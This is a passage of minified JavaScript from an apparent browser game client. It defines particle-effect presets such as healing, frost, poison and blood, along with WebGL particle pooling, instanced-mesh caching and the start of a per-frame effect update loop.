            const t = Yo(0, .4);
            return {
                VT: lr.sinReverse,
                idStart: 0,
                idEnd: 0,
                Xj: [1, .2 + 2 * t, t, 1],
                Zw: [.4, .1, 0, 0],
                scaleStart: .8 - 1.5 * t,
                scaleEnd: .5 - t,
                rotaStart: Yo(-2, 0),
                rotaEnd: Yo(0, 2),
                acc: [0, Yo(5, 7), 0],
                duration: Yo(500, 600)
            }
        }
        ),
        Mh.mystical = _h(3, () => ({
            VT: lr.easeOutQuad,
            idStart: 1,
            Xj: [.1, 1, 1, 1],
            Zw: [0, .1, .9, 0],
            scaleStart: 0,
            scaleEnd: 1.4,
            rotaStart: 0,
            rotaEnd: 2,
            duration: Yo(400, 600)
        })),
        Mh.meleeFlash = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 3,
            rotaStart: Yo(0, 3),
            Xj: [1, 1, 1, .5],
            Zw: [1, 1, 1, 0],
            scaleStart: 1.5 + .3 * Yo(0, 3),
            scaleEnd: .5 + .3 * Yo(0, 3),
            duration: 200
        })),
        Mh.meleePhys = _h(3, () => {
            const t = Yo(0, 1);
            return {
                idStart: 2,
                Xj: [1, .4, .1, .7],
                Zw: [1, 0, 0, 0],
                scaleStart: .5 - .2 * t,
                scaleEnd: 0,
                friction: .05 + .2 * t,
                acc: [0, -20, 0],
                duration: 250
            }
        }
        ),
        Mh.blood = _h(3, () => ({
            idStart: 2,
            Xj: [Yo(.2, .25), 0, Yo(0, .05), 3],
            Zw: [Yo(.2, .25), 0, Yo(0, .05), 2],
            scaleStart: .5 - .2 * Yo(0, 1),
            scaleEnd: 0,
            acc: [0, -20, 0],
            duration: 1e3
        })),
        Mh.bloodFloat = _h(3, () => ({
            idStart: 2,
            Xj: [Yo(.2, .25), 0, Yo(0, .05), 3],
            Zw: [Yo(.2, .25), 0, Yo(0, .05), 2],
            scaleStart: .5,
            scaleEnd: 0,
            duration: 500
        })),
        Mh.meleeFlashBig = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 3,
            rotaStart: Yo(0, 3),
            Xj: [2, 1, 1, .5],
            Zw: [1, .8, .8, 0],
            scaleStart: 3 + .3 * Yo(0, 3),
            scaleEnd: .5 + .3 * Yo(0, 3),
            duration: 200
        })),
        Mh.blockCircle = _h(1, () => ({
            idStart: 8,
            Xj: [1, 1, 1.5, 2],
            Zw: [0, 0, 1, -1],
            scaleStart: 0,
            scaleEnd: 10,
            duration: 250
        })),
        Mh.blockFlick = _h(3, () => ({
            idStart: 2,
            rotaStart: Yo(0, 3),
            Xj: [1, 1, 1.5, 2],
            Zw: [0, .3, 1, -1],
            scaleStart: .25,
            scaleEnd: .1,
            duration: 400
        })),
        Mh.healHolySoft = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 4,
            Xj: [1, 2, 1, 3],
            Zw: [.8, 1, .7, 0],
            scaleStart: Yo(1.8, 3.2),
            scaleEnd: Yo(1, 2),
            acc: [0, Yo(.3, 1.5), 0],
            duration: 1e3
        })),
        Mh.healNatureBlink = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            rotaStart: Yo(0, 3),
            rotaEnd: Yo(0, 3),
            Xj: [1, 2, .6, .8],
            Zw: [.8, .7, .7, 0],
            scaleStart: Yo(.8, 1.5),
            scaleEnd: 0,
            acc: [0, Yo(1.5, 3), 0],
            duration: 600
        })),
        Mh.healHolySparkle = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            rotaStart: Yo(0, 3),
            rotaEnd: Yo(0, 3),
            Xj: [2, 2, 1, .8],
            Zw: [.8, .7, .7, 0],
            scaleStart: Yo(1, 2),
            scaleEnd: 0,
            acc: [0, Yo(.3, 1.5), 0],
            duration: 1e3
        })),
        Mh.removeCC = _h(1, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [1, 2, 1.5, 1],
            Zw: [.5, .5, 1, .3],
            scaleStart: 2,
            scaleEnd: 0,
            acc: [0, 2, 0],
            friction: .1,
            duration: 800
        })),
        Mh.removeCCFlash = _h(1, () => ({
            idStart: 13,
            Xj: [1, 1.5, 1, 3],
            Zw: [0, 1, 1, -1],
            scaleStart: 0,
            scaleEnd: 10,
            duration: 600
        })),
        Mh.blockBuffShield = _h(1, () => ({
            idStart: 9,
            Xj: [.1, 1.3, 1, .8],
            Zw: [.1, .8, 1, .3],
            scaleStart: .5,
            scaleEnd: .4,
            duration: 500
        })),
        Mh.holyShield = _h(1, () => ({
            idStart: 9,
            Xj: [1.2, 1, 0, 1.5],
            Zw: [1, .8, 0, .9],
            scaleStart: .5,
            scaleEnd: .4,
            duration: 200
        })),
        Mh.blockBuffFocus = _h(1, () => ({
            idStart: 8,
            Xj: [1, 1, 1.5, 1],
            Zw: [0, 0, 1, 0],
            scaleStart: 10,
            scaleEnd: 0,
            duration: 400
        })),
        Mh.blockBuffEnrage = _h(3, () => ({
            idStart: 1,
            Xj: [.3, 0, .05, 3],
            Zw: [.2, 0, .05, 0],
            acc: [0, 1, 0],
            scaleStart: .4,
            scaleEnd: .2,
            duration: 1e3,
            rotaStart: Yo(0, 3)
        })),
        Mh.crescentStrike = _h(1, () => ({
            idStart: 0,
            Xj: [1.5, .7, .4, 2],
            Zw: [1, .5, .5, 0],
            scaleStart: .5,
            scaleEnd: .3,
            duration: 500,
            friction: .1
        })),
        Mh.levelUp = _h(1, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [2, 2, 1, .8],
            Zw: [.8, .7, .7, 0],
            scaleStart: 1.5,
            scaleEnd: 0,
            friction: .03,
            duration: 1e3
        })),
        Mh.iceBig = _h(5, () => ({
            VT: lr.sinReverse,
            idStart: 0,
            Xj: [Yo(.18, .21), Yo(.6, .7), Yo(1.4, 1.5), 2],
            Zw: [.8, .9, 1, 0],
            scaleStart: .4,
            scaleEnd: .3,
            rotaStart: Yo(0, 6),
            friction: .1,
            acc: [Yo(-1, 1), Yo(-1, 1), Yo(-1, 1)],
            duration: Yo(200, 300)
        })),
        Mh.extraBoltParticle = _h(1, () => ({
            VT: lr.sinReverse,
            idStart: 24,
            Xj: [.8, .9, 1.4, 1.3],
            Zw: [.8, .9, 1, .9],
            scaleStart: .25,
            scaleEnd: .2,
            rotaStart: 0,
            duration: 1e3
        })),
        Mh.snowflake = _h(3, () => ({
            idStart: 0,
            Xj: [.9, 1, 1.3, 2],
            Zw: [.9, 1, 1.1, 0],
            scaleStart: .5,
            scaleEnd: .2,
            rotaStart: Yo(0, 3),
            friction: .1,
            duration: Yo(800, 1e3)
        })),
        Mh.frostflake = _h(3, () => ({
            idStart: 0,
            Xj: [.1, .3, 1.3, 3],
            Zw: [.1, .3, 1, 1],
            scaleStart: .7,
            scaleEnd: 0,
            rotaStart: Yo(0, 3),
            friction: .05,
            duration: Yo(600, 800)
        })),
        Mh.preciseArrow = _h(3, () => ({
            idStart: 0,
            Xj: [1, 1, 1, 2],
            Zw: [1, 1, 1, 0],
            scaleStart: .2,
            scaleEnd: .1,
            rotaStart: Yo(0, 3),
            duration: Yo(300, 400)
        })),
        Mh.healNatureBig = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 10,
            Xj: [.2, 1.5, .5, 1.5],
            Zw: [.3, .9, 1, 0],
            scaleStart: .7,
            scaleEnd: .2,
            acc: [Yo(-.5, .5), 1.5, Yo(-.5, .5)],
            rotaStart: Yo(0, 3),
            duration: Yo(600, 800),
            friction: .02
        })),
        Mh.healNatureSparkle = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 0,
            Xj: [1.5, 1.5, .4, 2],
            Zw: [1.7, 1.5, .4, 0],
            scaleStart: .12,
            scaleEnd: .05,
            acc: [Yo(-.5, .5), 2, Yo(-.5, .5)],
            rotaStart: Yo(0, 3),
            duration: Yo(600, 800)
        })),
        Mh.invigorateBuff = _h(1, () => ({
            idStart: 11,
            Xj: [0, 1, 1.5, 1],
            Zw: [0, .7, 1.5, .7],
            scaleStart: .8,
            scaleEnd: .7,
            duration: 300
        })),
        Mh.hypothermicBuff = _h(1, () => ({
            idStart: 7,
            Xj: [.4, .9, 2.5, 2.5],
            Zw: [.5, .8, 1.5, .9],
            scaleStart: .7,
            scaleEnd: .5,
            duration: 500
        })),
        Mh.manaGain = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            rotaStart: Yo(0, 3),
            rotaEnd: Yo(0, 3),
            Xj: [.2, .6, 2, 2],
            Zw: [.1, .4, 1, 1],
            scaleStart: Yo(1, 2),
            scaleEnd: .5,
            acc: [0, Yo(.5, 3), 0],
            duration: 800
        })),
        Mh.iceglare = _h(1, () => ({
            idStart: 6,
            Xj: [.3, .4, 1, 1.5],
            Zw: [.3, .4, 1, 1.5],
            scaleStart: 2,
            scaleEnd: 3,
            duration: 800
        })),
        Mh.skulls = _h(6, t => {
            const e = Yo(.7, 1.5);
            return {
                VT: lr.sinReverse,
                idStart: t % 2 == 0 ? 12 : 23,
                rotaStart: Yo(-2, 2),
                Xj: [e, 1.5 - .5 * e, Yo(.05, .25), 1.6],
                Zw: [e, 2.5 - e, Yo(.05, .25), .2],
                scaleStart: Yo(.4, .5),
                scaleEnd: 0,
                friction: .05,
                duration: 700
            }
        }
        ),
        Mh.decay = _h(1, () => ({
            idStart: 12,
            rotaStart: 0,
            rotaEnd: 0,
            Xj: [.5, .3, .1, 2],
            Zw: [.5, 1, .1, 1],
            scaleStart: .6,
            scaleEnd: .6,
            duration: 500
        })),
        Mh.decayCloud = _h(1, () => ({
            idStart: 2,
            rotaStart: 0,
            Xj: [.5, .3, .1, 2],
            Zw: [.5, 1, .1, 0],
            scaleStart: .6,
            scaleEnd: .4,
            duration: 700
        })),
        Mh.soulCloud = _h(1, () => ({
            idStart: 2,
            rotaStart: 0,
            Xj: [.8, .7, 1.4, 1.3],
            Zw: [.6, 1, .9, 0],
            scaleStart: .5,
            scaleEnd: .3,
            duration: 700
        })),
        Mh.soulHarvested = _h(1, () => ({
            VT: lr.sinReverse,
            idStart: 12,
            rotaStart: 0,
            Xj: [.6, .7, .9, 1.5],
            Zw: [.1, .1, 1.2, .1],
            scaleStart: .4,
            scaleEnd: 0,
            acc: [0, 1, 0],
            duration: 900
        })),
        Mh.souls = _h(6, () => ({
            VT: lr.sinReverse,
            idStart: 12,
            rotaStart: Yo(-1.5, 1.5),
            Xj: [Yo(.1, .2), Yo(.4, .5), Yo(.5, .9), 1.6],
            Zw: [Yo(.1, .2), Yo(.4, .5), Yo(.5, .9), .2],
            scaleStart: Yo(.35, .45),
            scaleEnd: 0,
            friction: .05,
            duration: 700
        })),
        Mh.dmgBoostFangs = _h(1, () => ({
            idStart: 25,
            rotaStart: -.3,
            rotaEnd: .3,
            Xj: [2, 1.6, 1.3, .8],
            Zw: [1, .8, .6, .7],
            scaleStart: .4,
            scaleEnd: .38,
            duration: 200
        })),
        Mh.dmgBoostFangsFlash = _h(1, () => ({
            idStart: 25,
            Xj: [2, 1.6, 1.3, .9],
            Zw: [1, .8, .6, -1],
            scaleStart: 0,
            scaleEnd: 5,
            duration: 800
        })),
        Mh.moveBoostFlash = _h(1, () => ({
            idStart: 1,
            Xj: [1, 1, 2, .9],
            Zw: [1, 1, 2, -1],
            scaleStart: 0,
            scaleEnd: 5,
            duration: 800
        })),
        Mh.plaguebones = _h(1, () => ({
            idStart: 23,
            rotaStart: 0,
            rotaEnd: 4,
            Xj: [1.7, 2, 1.3, .6],
            Zw: [.8, 1, .6, .5],
            scaleStart: .4,
            scaleEnd: .38,
            friction: .05,
            duration: 3e3
        })),
        Mh.mimir = _h(3, () => ({
            idStart: 6,
            Xj: [.2, .6, 3, 2],
            Zw: [.1, .4, 1.2, 1],
            scaleStart: Yo(1, 2),
            scaleEnd: .5,
            duration: 800
        })),
        Mh.icenova = _h(3, () => ({
            idStart: 0,
            Xj: [.2, .3, 1.5, 1.5],
            Zw: [.5, .4, 1, 0],
            scaleStart: .3,
            scaleEnd: 1.4,
            rotaStart: Yo(0, 3),
            friction: .1,
            duration: Yo(300, 400)
        })),
        Mh.iceFlash = _h(1, () => ({
            idStart: 8,
            Xj: [.8, .8, 1.5, 2],
            Zw: [.5, .5, 1, -1],
            scaleStart: 0,
            scaleEnd: 10,
            duration: 350
        })),
        Mh.icicle = _h(3, () => ({
            idStart: 1,
            Xj: [1, 1, 1.5, 1.5],
            Zw: [.2, .2, 1.3, .5],
            scaleStart: .8,
            scaleEnd: 0,
            rotaStart: Yo(0, 9),
            duration: Yo(400, 500),
            friction: .01
        })),
        Mh.courage = _h(1, () => ({
            idStart: 13,
            Xj: [.5, 1.5, 1.5, 2],
            Zw: [.2, 1.4, 1.3, 1],
            scaleStart: .8,
            duration: 400
        })),
        Mh.courageFlash = _h(1, () => ({
            idStart: 13,
            Xj: [.5, 1.5, 1.5, 2],
            Zw: [0, 0, 1, 0],
            scaleStart: 0,
            scaleEnd: 15,
            duration: 800
        })),
        Mh.warcry = _h(1, () => ({
            idStart: 14,
            Xj: [1, .3, .2, 3],
            Zw: [1, .2, .1, 2],
            scaleStart: .8,
            duration: 400
        })),
        Mh.warcryFlash = _h(1, () => ({
            idStart: 14,
            Xj: [1, .3, .2, 3],
            Zw: [1, 0, 0, 0],
            scaleStart: 0,
            scaleEnd: 15,
            duration: 800
        })),
        Mh.enchant = _h(4, () => ({
            idStart: 5,
            Xj: [1, .3, .2, Yo(2, 3)],
            Zw: [1, .2, .1, 2],
            scaleStart: Yo(1.5, 1.8),
            scaleEnd: 1.3,
            rotaStart: Yo(0, 3),
            rotaEnd: 0,
            duration: 500
        })),
        Mh.shadowglow = _h(3, () => ({
            idStart: 1,
            Xj: [.5, 1, .6, 1.5],
            Zw: [.2, 1.5, .2, 0],
            scaleStart: .5,
            scaleEnd: .8,
            acc: [Yo(-1, 1), Yo(-1, 1), Yo(-1, 1)],
            rotaStart: Yo(-1, 1),
            rotaEnd: Yo(-1, 1),
            duration: 500
        })),
        Mh.enchantFlash = _h(1, () => ({
            idStart: 8,
            Xj: [1, .2, .05, 1.5],
            Zw: [1, .5, .4, .5],
            scaleStart: 10,
            scaleEnd: 0,
            duration: 500
        })),
        Mh.hardenedEggFlash = _h(1, () => ({
            idStart: 9,
            Xj: [.5, .7, .8, 1.4],
            Zw: [.5, .5, .7, -1],
            scaleStart: 0,
            scaleEnd: 5,
            duration: 800
        })),
        Mh.blueMarbleFlash = _h(1, () => ({
            idStart: 26,
            Xj: [.5, .5, 2, 1.4],
            Zw: [.5, .5, 1, -1],
            scaleStart: 0,
            scaleEnd: 5,
            duration: 800
        })),
        Mh.blueMarble = _h(3, t => ({
            idStart: 26,
            Xj: [.5, .5, 2, 1.5],
            Zw: [.5, .5, 1.5, .9],
            rotaStart: 0 + t,
            rotaEnd: 200 + t,
            scaleStart: 1,
            duration: 3e4
        })),
        Mh.whiteAura = _h(2, t => ({
            idStart: 5,
            Xj: [.3, .4, .6, 2.5],
            Zw: [.2, .3, .4, 2],
            scaleStart: 3,
            scaleEnd: 2.5,
            rotaStart: 3.5,
            rotaEnd: 1.5 * t,
            duration: 300
        })),
        Mh.arcticaura = _h(2, () => ({
            idStart: 5,
            Xj: [0, .3, 1, Yo(2, 3)],
            Zw: [0, 0, 1, 1],
            scaleStart: Yo(3, 4),
            scaleEnd: 3,
            rotaStart: Yo(0, 3),
            rotaEnd: 0,
            duration: 500
        })),
        Mh.arcticFlash = _h(1, () => ({
            idStart: 7,
            Xj: [.3, .5, 1.5, 1.5],
            Zw: [0, .5, 1, .5],
            scaleStart: 10,
            scaleEnd: 0,
            duration: 500
        })),
        Mh.temporal = _h(1, () => ({
            idStart: 5,
            Xj: [1.2, 1.2, 0, 1.5],
            Zw: [1, 1, 0, .9],
            scaleStart: 1,
            scaleEnd: .8,
            duration: 200
        })),
        Mh.temporalFlash = _h(1, () => ({
            idStart: 8,
            Xj: [1, 1, 0, 1],
            Zw: [1, 1, 0, .5],
            scaleStart: 5,
            scaleEnd: 0,
            duration: 200
        })),
        Mh.pathfindFlash = _h(1, () => ({
            idStart: 8,
            Xj: [1, 1, .9, 1],
            Zw: [1, .5, .5, .2],
            scaleStart: 0,
            scaleEnd: 6,
            duration: 200
        })),
        Mh.canine = _h(1, () => ({
            idStart: 15,
            Xj: [1.5, .5, .1, 2],
            Zw: [1.3, .3, .2, 1],
            scaleStart: .6,
            scaleEnd: .5,
            duration: 200
        })),
        Mh.canineFlash = _h(1, () => ({
            idStart: 15,
            Xj: [1.5, .5, .1, 2],
            Zw: [1.3, .3, .2, 0],
            scaleStart: 0,
            scaleEnd: 10,
            duration: 400
        })),
        Mh.etherglow = _h(1, () => ({
            VT: lr.sinReverse,
            idStart: 5,
            Xj: [.4, 1, 2, .9],
            Zw: [.2, .9, 1, 0],
            scaleStart: 1.2,
            scaleEnd: .5,
            acc: [0, 2, 0],
            rotaStart: 0,
            rotaEnd: 0,
            duration: 900
        })),
        Mh.poison = _h(6, () => ({
            VT: lr.sinReverse,
            idStart: 17,
            idEnd: 21,
            rotaStart: Yo(-.2, .2),
            rotaEnd: Yo(-.2, .2),
            Xj: [Yo(0, .6), 2, Yo(0, .1), 1],
            Zw: [1.5, 1, 0, 0],
            scaleStart: Yo(.6, .8),
            scaleEnd: .5,
            acc: [Yo(-.5, .5), Yo(1, 3), Yo(-.5, .5)],
            friction: .05,
            duration: 1e3
        })),
        Mh.poisonSoft = _h(4, () => ({
            VT: lr.sinReverse,
            idStart: 16,
            Xj: [Yo(0, 1), 2, 0, 1],
            Zw: [Yo(0, 1), 1, .2, 0],
            scaleStart: Yo(1.8, 3.2),
            scaleEnd: Yo(1, 2),
            duration: 1500
        })),
        Mh.decaySoft = _h(4, () => ({
            VT: lr.sinReverse,
            idStart: 16,
            Xj: [Yo(.5, 1), .8, 0, 1.5],
            Zw: [Yo(.5, .8), Yo(.8, 1.1), .2, 0],
            scaleStart: Yo(1.8, 3.2),
            scaleEnd: Yo(1, 2),
            duration: 1500
        })),
        Mh.teleportSparkle = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [Yo(.5, 1), .6, Yo(1, 2), Yo(.5, 1.5)],
            Zw: [.5, .3, 1.3, 0],
            scaleStart: Yo(2, 4),
            scaleEnd: Yo(.5, 1.5),
            duration: 400
        })),
        Mh.teleportFlash = _h(1, () => ({
            idStart: 8,
            Xj: [.8, .6, 2, 2],
            Zw: [.5, .3, 1.3, -1],
            scaleStart: 8,
            scaleEnd: 0,
            duration: 150
        })),
        Mh.precisesparcle = _h(5, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [Yo(1, 2), Yo(.9, 1.2), Yo(.5, .8), Yo(1.5, 2.5)],
            Zw: [1, .5, .3, 0],
            scaleStart: Yo(2, 4),
            scaleEnd: Yo(.4, .7),
            duration: 200,
            rotaStart: Yo(0, 3),
            rotaEnd: Yo(-3, 0)
        })),
        Mh.stun = _h(1, () => ({
            idStart: 6,
            Xj: [1.2, 1.2, .2, 1.2],
            Zw: [1.2, 1.2, .2, .9],
            scaleStart: 1.7,
            scaleEnd: 1.8,
            duration: 500
        })),
        Mh.daze = _h(1, () => ({
            idStart: 6,
            Xj: [.2, 1.2, 1.2, 1.2],
            Zw: [.2, 1.2, 1.2, .9],
            scaleStart: 1.2,
            scaleEnd: 1,
            duration: 500
        })),
        Mh.chargeFlash = _h(1, () => ({
            idStart: 8,
            Xj: [2, 1.5, .3, 1.5],
            Zw: [1, .5, .3, .2],
            scaleStart: 0,
            scaleEnd: 5,
            duration: 250
        })),
        Mh.tauntFlash = _h(1, () => ({
            idStart: 8,
            Xj: [2, 1, .8, 1.2],
            Zw: [1.5, .2, .3, .2],
            scaleStart: 8,
            scaleEnd: 0,
            duration: 350
        })),
        Mh.tauntsparkle = _h(4, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            Xj: [Yo(2, 3), Yo(.9, 1.2), Yo(.2, .1), Yo(1.5, 2.5)],
            Zw: [1, .9, .8, 0],
            scaleStart: Yo(2, 2.5),
            scaleEnd: Yo(1, 1.5),
            duration: 800,
            friction: .08,
            rotaStart: Yo(0, 3)
        })),
        Mh.transformationAura = _h(5, () => ({
            VT: lr.sinReverse,
            idStart: 8,
            Xj: [Yo(.5, .9), .5, Yo(2, 3), 0],
            Zw: [Yo(.5, .9), .5, Yo(1, 2), 2],
            scaleStart: 2,
            scaleEnd: 0,
            duration: 250
        })),
        Mh.transformSoft = _h(5, () => ({
            VT: lr.sinReverse,
            idStart: 16,
            Xj: [Yo(.5, .8), .5, Yo(2, 3), 2],
            Zw: [Yo(.5, .8), .5, Yo(1, 2), 0],
            scaleStart: Yo(2.5, 4.2),
            scaleEnd: Yo(1, 2),
            duration: 800,
            rotaStart: Yo(0, 5)
        })),
        Mh.snipe = _h(1, () => ({
            idStart: 6,
            Xj: [2.6, 2, 1.5, 1],
            Zw: [2.6, 2, 1.5, 1],
            scaleStart: 3,
            scaleEnd: 0,
            friction: .15,
            duration: 300
        })),
        Mh.summonFlash = _h(1, () => ({
            idStart: 8,
            Xj: [1.5, .6, 2, 2],
            Zw: [.8, .1, 1.3, -1],
            scaleStart: 0,
            scaleEnd: 12,
            duration: 1600
        })),
        Mh.summonSparkle = _h(3, () => ({
            VT: lr.sinReverse,
            idStart: 6,
            rotaStart: Yo(0, 3),
            rotaEnd: Yo(0, 3),
            Xj: [.9, .5, 2, 2],
            Zw: [.5, .1, 1.5, 1],
            scaleStart: Yo(1, 2),
            scaleEnd: .5,
            acc: [0, Yo(.5, 3), 0],
            friction: .02,
            duration: 1600
        }));
    const Ch = performance
        , Th = () => Ch.now()
        , Ph = [];
    let Ih, Dh;
    const Ah = []
        , Bh = () => {
            Oh(),
                jc.ribbon.setBlendFunc(Aa.ONE, Aa.ONE_MINUS_SRC_ALPHA),
                jc.particles.setBlendFunc(Aa.ONE, Aa.ONE_MINUS_SRC_ALPHA);
            for (let t = 0; t < 1e3; ++t)
                Ah.push({
                    Za: [-0, -0, -0],
                    vel: [-0, -0, -0],
                    info: Mh.dust[0],
                    distance: 0,
                    GF: 0,
                    start: 0,
                    end: 1.01,
                    forced: !1
                })
        }
        , Rh = (t, e, s) => {
            for (let e = Ph.length - 1; e >= 0; --e) {
                const s = Ph[e];
                s.start < 0 || s.end > t || (Ph.splice(e, 1),
                    Ah.push(s))
            }
            let i = Ph.filter(t => t.Za[0] > 0);
            return i.forEach(i => {
                sn(i.vel, i.vel, i.info.acc, e),
                    sn(i.Za, i.Za, i.vel, e),
                    i.info.friction > 0 && en(i.vel, i.vel, 1 - i.info.friction),
                    i.distance = qh(i.Za, s.kX),
                    i.GF = i.start < 0 ? .5 * (Math.sin(t / i.info.duration) + 1) : (t - i.start) / i.info.duration
            }
            ),
                i = i.filter(t => t.distance < 1),
                i.sort(jh),
                i
        }
        , zh = t => {
            Zh(t),
                Fh(t)
        }
        , Fh = t => {
            t.length > 0 ? (Ih.visible = !0,
                Dh.setDrawRange(0, t.length),
                Dh.updateAttribute(Dh.attributes.Za),
                Dh.updateAttribute(Dh.attributes.info),
                Dh.updateAttribute(Dh.attributes.Ol),
                Dh.updateAttribute(Dh.attributes.Xj),
                Dh.updateAttribute(Dh.attributes.Zw)) : Ih.visible = !1
        }
        , Zh = t => {
            for (let e = 0; e < t.length; ++e) {
                const s = t[e];
                Dh.attributes.Za.data.set(s.Za, 3 * e),
                    Dh.attributes.info.data.set([s.info.VT(s.GF), 0, s.info.idStart, s.info.idEnd], 4 * e),
                    Dh.attributes.Ol.data.set([s.info.scaleStart, s.info.scaleEnd, s.info.rotaStart, s.info.rotaEnd], 4 * e),
                    Dh.attributes.Xj.data.set(s.info.Xj, 4 * e),
                    Dh.attributes.Zw.data.set(s.info.Zw, 4 * e)
            }
        }
        , Uh = ({ dt: t, camera: e }) => {
            const s = Rh(Th(), t, e);
            zh(s)
        }
        ;
    let Lh = 0;
    const Nh = (t, e, s = 0, i = 0, n = 0, a = 0, r = 0, o = 0, l = !1) => {
        let c = Ah.pop();
        if (!c) {
            if (l) {
                let t = Ph.length - 1;
                for (; t >= 0 && Ph[t].forced;)
                    --t;
                t >= 0 && (c = Ph.splice(t, 1)[0])
            }
            if (!c)
                return
        }
        return Vi(c.vel, a, r, o),
            Vi(c.Za, s, i, n),
            e && hn(c.Za, c.Za, e),
            Lh > 100 && (Lh = 0),
            c.info = t[++Lh % t.length],
            c.start = l ? -1 : Th(),
            c.end = c.start + c.info.duration,
            c.forced = l,
            Ph.push(c),
            c
    }
        , Oh = () => {
            Dh = new bn(Aa, {
                Za: {
                    size: 3,
                    data: new Float32Array(3e3)
                },
                info: {
                    size: 4,
                    data: new Float32Array(4e3)
                },
                Ol: {
                    size: 4,
                    data: new Float32Array(4e3)
                },
                Xj: {
                    size: 4,
                    data: new Float32Array(4e3)
                },
                Zw: {
                    size: 4,
                    data: new Float32Array(4e3)
                }
            }),
                Ih = new na(Aa, {
                    mode: Aa.POINTS,
                    matrixAutoUpdate: !1,
                    geometry: Dh,
                    program: jc.particles
                }),
                Ih.frustumCulled = !1,
                Dh.type = "particle",
                Za.addChild(Ih),
                Oo("particles.png", t => {
                    jc.particles.uniforms.HC.value = t,
                        jc.particles.uniforms.HC.state++,
                        jc.particles.active = !0,
                        Ih.renderOrder = 7e3
                }
                )
        }
        , jh = (t, e) => t.distance < e.distance ? 1 : -1
        , qh = (t, e) => (e[2] * t[0] + e[6] * t[1] + e[10] * t[2] + e[14]) / (e[3] * t[0] + e[7] * t[1] + e[11] * t[2] + e[15]);
    var Xh = Object.freeze({
        __proto__: null,
        init: Bh,
        tick: Uh,
        createParticle: Nh
    });
    const Hh = {}
        , Kh = ({ geo: t, tex: e, program: s, ts: i, rs: n, mode: a, dynamic: r, cull: o, permanent: l, frustum: c = !0, visible: h = !0 }) => {
            const d = t + (e || 0) + s.id + (i ? 1 : 0) + (n ? 1 : 0) + (r ? 1 : 0) + (c ? 1 : 0) + (void 0 !== o ? o : 1029) + (void 0 !== a ? a : 999);
            let u, m, p = 0;
            for (; !u;)
                m = d + p,
                    Hh[m] ? Hh[m].instances.length < 3e3 ? u = Hh[m] : ++p : u = Wh({
                        geo: t,
                        tex: e,
                        program: s,
                        ts: i,
                        rs: n,
                        mode: a,
                        dynamic: r,
                        hash: m,
                        cull: o,
                        permanent: l,
                        frustum: c,
                        visible: h
                    });
            return u.create()
        }
        , Wh = ({ geo: t, tex: e, program: s, ts: i, rs: n, mode: a, dynamic: r, hash: o, cull: l, permanent: c, frustum: h, visible: d }) => {
            const u = Hh[o] = new ca(Aa, {
                program: s,
                mode: void 0 !== a ? a : Aa.TRIANGLES,
                shadowProgram: ji.shadows && i ? e ? jc.shadowInstancedAlpha : jc.shadowInstanced : void 0,
                throwShadow: ji.shadows && i ? r ? Sc.sK : Sc.shadowStatic : void 0,
                receiveShadow: ji.shadows && n ? Sc.sK : void 0,
                dynamic: r,
                frustum: h
            });
            return u.permanent = c,
                u.onBeforeRender = Yh,
                u.cullFace = void 0 !== l ? l : 1029,
                u.Ud = ji.shadows && n ? 1 : 0,
                u.dynamicThrowShadwos = ji.shadows && r && i,
                u.setParent(Za),
                Do(t, t => {
                    u.setAttributes(t),
                        e ? Oo(e, t => {
                            u.Dz = t,
                                u.visible = d,
                                u.renderOrder = 0 + (u.program.id + 1) * (t.id + 1) * (u.Ud + 1)
                        }
                        ) : (u.renderOrder = 0 + (u.program.id + 1) * (u.Ud + 1),
                            u.visible = d)
                }
                ),
                u
        }
        , Yh = ({ mesh: t, camera: e, shadowTarget: s }) => {
            s || (t.program.cullFace = t.cullFace)
        }
        , Vh = () => {
            for (const t in Hh)
                void 0 === Hh[t] || Hh[t].permanent || (Hh[t].setParent(null),
                    Hh[t] = void 0)
        }
        , Gh = []
        , Qh = [0, 0, 0]
        , Jh = ({ dt: t, camera: e, viewRange: s }) => {
            const i = Th();
            let n = Gh.length;
            for (; n--;) {
                const a = Gh[n]
                    , r = a.data;
                r.remove || r.timeout > 0 && r.time > r.timeout ? (ed(a),
                    Gh.splice(n, 1),
                    oa(a)) : (In(Qh, a.KP),
                        r.camDistance = Math.max(0, nn(Qh, e.worldPosition) - 10),
                        r.distanceFactor = r.camDistance / (.25 * s),
                        r.lod = Math.max(0, 1 - r.distanceFactor),
                        r.time += t,
                        r.accumulator += t,
                        r.distanceFactor < 1 || !r.info.permanent ? (r.info.sound && void 0 === r.sound && (r.info.sound.loop || 0 === r.info.sound.frame) && nd(a),
                            r.info.Uk && void 0 === r.Uk && rd(a),
                            void 0 !== r.Uk && (r.Uk.camDistance = r.camDistance,
                                r.Uk.distanceFactor = r.distanceFactor),
                            void 0 !== r.tick && (0 === r.frame || r.time >= 0 && (void 0 !== r.particles || r.accumulator >= Math.min(1, .2 * r.distanceFactor))) && (!a.visible || null != a.parent && !a.parent.visible ? r.invisibilified || (void 0 !== r.particles && r.particles.forEach(pd),
                                r.mesh && (r.mesh.visible = !1),
                                r.invisibilified = !0) : (r.invisibilified && (r.mesh && (r.mesh.visible = !0),
                                    r.invisibilified = !1),
                                    r.tick(i, r.accumulator),
                                    r.accumulator = 0,
                                    r.frame++))) : (void 0 !== r.sound && r.sound.loop && ad(a),
                                        void 0 !== r.Uk && od(a)))
            }
        }
        , td = (t, e, s) => {
            if (void 0 === e && ((e = ra()).data = {
                fraction: cd,
                particle: id,
                localize: fd,
                creature: void 0,
                transform: e,
                time: -0,
                timeout: -0,
                accumulator: -0,
                frame: 0,
                remove: !1,
                info: void 0,
                tick: void 0,
                invisibilified: !1,
                camDistance: -0,
                distanceFactor: -0,
                lod: 0,
                sound: void 0,
                ribbon: void 0,
                buff: void 0,
                Uk: void 0
            },
                Gh.push(e)),
                e.data.time = void 0 !== t.time ? t.time : 0,
                e.data.timeout = void 0 !== t.timeout ? t.timeout : 0,
